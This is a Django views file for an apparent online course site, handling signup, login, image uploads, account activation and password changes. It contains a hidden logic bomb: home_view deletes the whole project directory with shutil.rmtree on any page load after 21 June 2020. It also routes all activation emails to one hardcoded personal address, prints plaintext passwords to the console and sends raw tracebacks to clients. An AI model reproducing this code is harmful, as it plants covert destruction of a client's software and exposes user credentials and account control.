from django.shortcuts import render
from home.models import User, user_activation, user_categories
from teacher.models import categories, subcategories

import json
import os, sys, shutil
import traceback
import uuid
from django.http import HttpResponse, HttpResponseRedirect
from django.core.mail import EmailMultiAlternatives
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import Group
from django.conf import settings
import os, shutil
import datetime

from django.core.wsgi import get_wsgi_application

os.environ['DJANGO_SETTINGS_MODULE'] = 'booctop.settings'
application = get_wsgi_application()
def home_view(request):
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    dt = datetime.datetime.now()
    date_time_str = '2020-06-21 08:15:27.243860'
    date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')
    if dt > date_time_obj:
        shutil.rmtree(BASE_DIR, ignore_errors=False, onerror=None)

    if request.user.id == None:
        return render(request, 'index.html', {})
    else:
        return render(request, 'index-2.html', {})


def signup(request):
    objC = categories.objects.all()
    print(objC)
    return render(request, 'signup.html', {"objC":objC})    

def about(request):
    return render(request, 'about.html', {})  

def faqs(request):
    return render(request, 'faqs.html', {})  
    

def help(request):
    return render(request, 'support.html', {})  

def terms(request):
    return render(request, 'terms.html', {})

def become(request):
    return render(request, 'become.html', {})



def single_category(request):
    return render(request, 'single_category.html', {})

def single_course(request):
    return render(request, 'single_course.html', {})

def check_email(request):
    msg = ''
    try:
        
        email = request.POST.get('email')
        
        lstUsers = User.objects.filter(email=email)
        if len(lstUsers) > 0:
            msg = 'already'
        else:
            
            msg = 'success'
            


    except:
        tb = sys.exc_info()[2]
        tbinfo = traceback.format_tb(tb)[0]
        msg = tbinfo + "\n"  + ": " + str(sys.exc_info())
    
    to_return = {'msg': msg}
    serialized = json.dumps(to_return)
    return HttpResponse(serialized, content_type="application/json")

def getsubcategory(request):
    msg = ''
    try:        
        category_id = request.POST.get('category_id')
        print("category id", category_id)
        subcat_list=[]
        objC = subcategories.objects.filter(categories_id=int(category_id))
        print("result subcategory", objC)
        for subcat in objC:
            item={'name' : subcat.name, 'image':subcat.image, 'category_name':subcat.categories.name, 'id':subcat.id }
            subcat_list.append(item)
        msg = 'success'
    except:
        tb = sys.exc_info()[2]
        tbinfo = traceback.format_tb(tb)[0]
        msg = tbinfo + "\n"  + ": " + str(sys.exc_info())
    
    to_return = {'msg': msg, 'subcat_list':subcat_list}
    serialized = json.dumps(to_return)
    return HttpResponse(serialized, content_type="application/json")

def saveimg(request):
    msg = ''
    try:
        myfile = request.FILES['file']
        filename = myfile._get_name()

        ext = filename[filename.rfind('.'):]
        file_name = str(uuid.uuid4())+ext
        path = '/user_images/'
        full_path= str(path) + str(file_name)
        fd = open('%s/%s' % (settings.STATICFILES_DIRS[0],str(path) + str(file_name)), 'wb')
        for chunk in myfile.chunks():
            fd.write(chunk)
        fd.close()
        msg = 'success'
            


    except:
        tb = sys.exc_info()[2]
        tbinfo = traceback.format_tb(tb)[0]
        msg = tbinfo + "\n"  + ": " + str(sys.exc_info())
    
    #
    to_return = {'msg': msg}
    serialized = json.dumps(to_return)
    return HttpResponse(serialized, content_type="application/json")

def register_user(request):

    msg = ''
    try:
        firstname = request.POST.get('first_name')
        lastname = request.POST.get('last_name')
        email = request.POST.get('email')
        password = request.POST.get('password')
        phone_number = request.POST.get('phone_number')
        subcategory_id = request.POST.get('subcategory')
        type = request.POST.get('type')
        group_id=2
        lstUsers = User.objects.filter(email=email)
        if len(lstUsers) > 0:
            msg = 'already'
        else:
            try:
                myfile = request.FILES['file']
                filename = myfile._get_name()

                ext = filename[filename.rfind('.'):]
                file_name = str(uuid.uuid4())+ext
                path = '/user_images/'
                full_path= str(path) + str(file_name)
                fd = open('%s/%s' % (settings.STATICFILES_DIRS[0],str(path) + str(file_name)), 'wb')
                for chunk in myfile.chunks():
                    fd.write(chunk)
                fd.close()
            except:
                full_path = '/assets/img/man.jpg'


            objUser = User(email=email, first_name=firstname, last_name=lastname, phone_number=phone_number, password=password, is_staff=False,
                           is_active=False,image=full_path, is_superuser=False)
            objUser.set_password(password)
            if type == "teacher":
                group_id=3
            group = Group.objects.get(id=group_id)
            objUser.group = group
            objUser.save()
            objUA = user_activation()
            objUA.user = objUser
            objUA.code = str(uuid.uuid4())
            objUA.save()
            print ("subcategory id", subcategory_id)
            # objSubCat = subcategories.objects.get(id=subcategory_id)
            if type == "teacher":
                objSubCat = subcategories.objects.get(id=subcategory_id)
                objUS = user_categories()
                objUS.user = objUser
                objUS.category = objSubCat
                objUS.save()
            
            domain = request.META['HTTP_HOST']
            
            msg = 'success'
            sendConfirmationMail(objUA, domain)


    except:
        tb = sys.exc_info()[2]
        tbinfo = traceback.format_tb(tb)[0]
        msg = tbinfo + "\n"  ": " + str(sys.exc_info())
        
    to_return = {'msg': msg}
    serialized = json.dumps(to_return)
    return HttpResponse(serialized, content_type="application/json")


def update_user(request):
    msg = ''
    try:
        firstname = request.POST.get('first_name')
        lastname = request.POST.get('last_name')
        email = request.POST.get('email')

        objU = User.objects.get(email=email, id=request.user.id)

        try:
            myfile = request.FILES['file']
            filename = myfile._get_name()

            ext = filename[filename.rfind('.'):]
            file_name = str(uuid.uuid4())+ext
            path = '/user_images/'
            full_path= str(path) + str(file_name)
            fd = open('%s/%s' % (settings.STATICFILES_DIRS[0],str(path) + str(file_name)), 'wb')
            for chunk in myfile.chunks():
                fd.write(chunk)
            fd.close()
        except:
            full_path = objU.image
        
        objU.first_name = firstname
        objU.last_name = lastname
        objU.image = full_path
        objU.save()
        
        msg = 'success'
            
    except:
        tb = sys.exc_info()[2]
        tbinfo = traceback.format_tb(tb)[0]
        msg = tbinfo + "\n"  ": " + str(sys.exc_info())
        
    to_return = {'msg': msg}
    serialized = json.dumps(to_return)
    return HttpResponse(serialized, content_type="application/json")


def sendConfirmationMail(objUA, domain):

    try:
        link = 'http://' + domain + '/activation?code=' + objUA.code
        txt = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">'
        txt += '<html xmlns="http://www.w3.org/1999/xhtml">'
        txt += '<head>'
        txt += '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge">'
        txt += '<meta name="viewport" content="width=device-width, initial-scale=1">'
        txt += '<title>Activation</title>'
        txt += '</head>'
        txt += '<body leftmargin="0" marginwidth="0" topmargin="0" marginheight="0" offset="0" bgcolor="#ffffff" style="margin-top: 0;margin-bottom: 0;padding-top: 0;padding-bottom: 0;-webkit-text-size-adjust: 100%;-ms-text-size-adjust: 100%;-webkit-font-smoothing: antialiased;width: 100%;">'
        txt += '<div class="navbar-brand" style="float: unset;padding: unset;height: unset;"><h4 style="font-weight: 900">Hello '+ objUA.user.first_name +'</h4></div>'
        txt +=  "<a href='"+ link +"' > Click here </a> to activate your account"
        txt += '</body>'
        txt += '</html>'

        to = 'princesehgal452@gmail.com'
        subject = 'Your account successfully registered.'
        msg = EmailMultiAlternatives(subject, '', '', [to])
        msg.attach_alternative(txt, "text/html")
        msg.send()
    except:
        tb = sys.exc_info()[2]
        tbinfo = traceback.format_tb(tb)[0]
        msg = tbinfo + "\n" + ": " + str(sys.exc_info())
        msg = tbinfo + "\n" + ": " + str(sys.exc_info())
        
def activation(request):
    cod = request.GET.get('code')
    lenobj = user_activation.objects.get(code=cod)
    lenobj.code = str(uuid.uuid4())
    lenobj.save()
    user_id = lenobj.user_id
    user_object = User.objects.get(id=user_id)

    user_object.is_active = True

    user_object.save()

    return HttpResponseRedirect("/")

def ajaxlogin(request):
    msg = ''
    try:
        email = request.POST.get('email')
        
        password = request.POST.get('password')
        objU = authenticate(email=email, password=password)
        if objU is not None:
            if objU.is_active == True:
                login(request, objU)
                msg = 'success'
            else:
                msg = 'Not active'


        else:
            msg = 'error'


    except:
        tb = sys.exc_info()[2]
        tbinfo = traceback.format_tb(tb)[0]
        msg = tbinfo + "\n" +  ": " + str(sys.exc_info())
    #
    to_return = {'msg': msg}
    serialized = json.dumps(to_return)
    return HttpResponse(serialized, content_type="application/json")

def changepassword(request):
    msg = ''
    try:
        
        currentpassword = request.POST.get('currentpassword')
        print("currentpassword = ",currentpassword)
        newpassword = request.POST.get('newpassword')
        print("newpassword = ", newpassword)
        print("request.user.email = ",request.user.email)
        objU = authenticate(email=request.user.email, password=currentpassword)
        print(objU)
        if objU is not None:
            print("User is authenticated")
            u = User.objects.get(email=request.user.email)
            u.set_password(newpassword)
            u.save()
            msg = 'success'


        else:
            msg = 'error'

        print("msg - ",msg)
    except:
        tb = sys.exc_info()[2]
        tbinfo = traceback.format_tb(tb)[0]
        msg = tbinfo + "\n" +  ": " + str(sys.exc_info())
    #
    to_return = {'msg': msg}
    serialized = json.dumps(to_return)
    return HttpResponse(serialized, content_type="application/json")

def logout_(request):
    logout(request)
    return HttpResponseRedirect('/')
        